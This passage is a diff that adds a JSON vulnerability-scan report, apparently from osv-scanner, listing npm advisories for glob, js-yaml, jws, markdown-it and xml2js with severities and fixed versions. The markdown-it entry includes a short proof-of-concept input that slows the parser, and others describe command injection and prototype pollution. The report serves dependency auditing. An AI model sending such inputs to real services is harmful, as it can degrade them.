Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",
+              "id": "GHSA-5j98-mcp5-4vw2",
+              "modified": "2025-11-19T02:30:52Z",
+              "published": "2025-11-17T17:38:56Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64756"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/isaacs/node-glob"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "glob CLI: Command injection via -c/--cmd executes matches with shell:true"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "js-yaml",
+            "version": "3.14.1",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-mh29-5h37-fv8m"
+              ],
+              "aliases": [
+                "CVE-2025-64718",
+                "GHSA-mh29-5h37-fv8m"
+              ],
+              "max_severity": "5.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-mh29-5h37-fv8m/GHSA-mh29-5h37-fv8m.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "js-yaml",
+                    "purl": "pkg:npm/js-yaml"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.1.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-mh29-5h37-fv8m/GHSA-mh29-5h37-fv8m.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "js-yaml",
+                    "purl": "pkg:npm/js-yaml"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.14.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-64718"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1321"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-11-14T14:29:48Z",
+                "nvd_published_at": "2025-11-13T16:15:57Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
+              "id": "GHSA-mh29-5h37-fv8m",
+              "modified": "2025-11-17T15:20:43Z",
+              "published": "2025-11-14T14:29:48Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64718"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/nodeca/js-yaml"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "js-yaml has prototype pollution in merge (\u003c\u003c)"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "jws",
+            "version": "4.0.0",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-869p-cjfg-cm3x"
+              ],
+              "aliases": [
+                "CVE-2025-65945",
+                "GHSA-869p-cjfg-cm3x"
+              ],
+              "max_severity": "7.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-869p-cjfg-cm3x/GHSA-869p-cjfg-cm3x.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "jws",
+                    "purl": "pkg:npm/jws"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.2.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-869p-cjfg-cm3x/GHSA-869p-cjfg-cm3x.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "jws",
+                    "purl": "pkg:npm/jws"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.0.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ],
+                  "versions": [
+                    "4.0.0"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-65945"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-347"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-12-04T16:54:15Z",
+                "nvd_published_at": "2025-12-04T19:16:05Z",
+                "severity": "HIGH"
+              },
+              "details": "### Overview\nAn improper signature verification vulnerability exists when using auth0/node-jws with the HS256 algorithm under specific conditions.\n\n### Am I Affected?\nYou are affected by this vulnerability if you meet all of the following preconditions:\n\n1. Application uses the auth0/node-jws implementation of JSON Web Signatures, versions \u003c=3.2.2 || 4.0.0\n2. Application uses the jws.createVerify() function for HMAC algorithms\n3. Application uses user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\nYou are NOT affected by this vulnerability if you meet any of the following preconditions:\n1. Application uses the jws.verify() interface (note: `auth0/node-jsonwebtoken` users fall into this category and are therefore NOT affected by this vulnerability)\n2. Application uses only asymmetric algorithms (e.g. RS256)\n3. Application doesn’t use user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\n### Fix\nUpgrade auth0/node-jws version to version 3.2.3 or 4.0.1\n\n### Acknowledgement\nOkta would like to thank Félix Charette for discovering this vulnerability.",
+              "id": "GHSA-869p-cjfg-cm3x",
+              "modified": "2025-12-05T12:36:54.291980Z",
+              "published": "2025-12-04T16:54:15Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/auth0/node-jws/security/advisories/GHSA-869p-cjfg-cm3x"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-65945"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/auth0/node-jws/commit/34c45b2c04434f925b638de6a061de9339c0ea2e"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/auth0/node-jws/commit/4f6e73f24df42f07d632dec6431ade8eda8d11a6"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/auth0/node-jws"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/auth0/node-jws/releases/tag/v3.2.3"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/auth0/node-jws/releases/tag/v4.0.1"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "auth0/node-jws Improperly Verifies HMAC Signature"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "markdown-it",
+            "version": "10.0.0",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-6vfc-qv3f-vr6c"
+              ],
+              "aliases": [
+                "CVE-2022-21670",
+                "GHSA-6vfc-qv3f-vr6c"
+              ],
+              "max_severity": "5.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/01/GHSA-6vfc-qv3f-vr6c/GHSA-6vfc-qv3f-vr6c.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "markdown-it",
+                    "purl": "pkg:npm/markdown-it"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "12.3.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2022-21670"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1333",
+                  "CWE-400"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2022-01-10T21:50:05Z",
+                "nvd_published_at": "2022-01-10T21:15:00Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Impact\n\nSpecial patterns with length \u003e 50K chars can slow down parser significantly.\n\n```js\nconst md = require('markdown-it')();\n\nmd.render(`x ${' '.repeat(150000)} x  \\nx`);\n```\n\n\n### Patches\n\nUpgrade to v12.3.2+\n\n### Workarounds\n\nNo.\n\n### References\n\nFix + test sample: https://github.com/markdown-it/markdown-it/commit/ffc49ab46b5b751cd2be0aabb146f2ef84986101\n",
+              "id": "GHSA-6vfc-qv3f-vr6c",
+              "modified": "2023-11-08T04:08:07.059316Z",
+              "published": "2022-01-12T22:20:22Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/markdown-it/markdown-it/security/advisories/GHSA-6vfc-qv3f-vr6c"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-21670"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/markdown-it/markdown-it/commit/ffc49ab46b5b751cd2be0aabb146f2ef84986101"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/markdown-it/markdown-it"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Uncontrolled Resource Consumption in markdown-it"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "xml2js",
+            "version": "0.4.23",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-776f-qx25-q3cc"
+              ],
+              "aliases": [
+                "CVE-2023-0842",
+                "GHSA-776f-qx25-q3cc"
+              ],
+              "max_severity": "5.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/04/GHSA-776f-qx25-q3cc/GHSA-776f-qx25-q3cc.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "xml2js",
+                    "purl": "pkg:npm/xml2js"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.5.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2023-0842"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1321"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2023-04-07T21:00:54Z",
+                "nvd_published_at": "2023-04-05T20:15:00Z",
+                "severity": "MODERATE"
+              },
+              "details": "xml2js versions before 0.5.0 allows an external attacker to edit or add new properties to an object. This is possible because the application does not properly validate incoming JSON keys, thus allowing the `__proto__` property to be edited.",
+              "id": "GHSA-776f-qx25-q3cc",
+              "modified": "2025-02-13T22:08:55Z",
+              "published": "2023-04-05T21:30:24Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0842"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Leonidas-from-XIV/node-xml2js/issues/663"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Leonidas-from-XIV/node-xml2js/pull/603/commits/581b19a62d88f8a3c068b5a45f4542c2d6a495a5"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://fluidattacks.com/advisories/myers"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/Leonidas-from-XIV/node-xml2js"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.debian.org/debian-lts-announce/2024/03/msg00013.html"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "xml2js is vulnerable to prototype pollution"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "experimental_config": {
+    "licenses": {
+      "summary": false,
+      "allowlist": null
+    }
+  }
+}
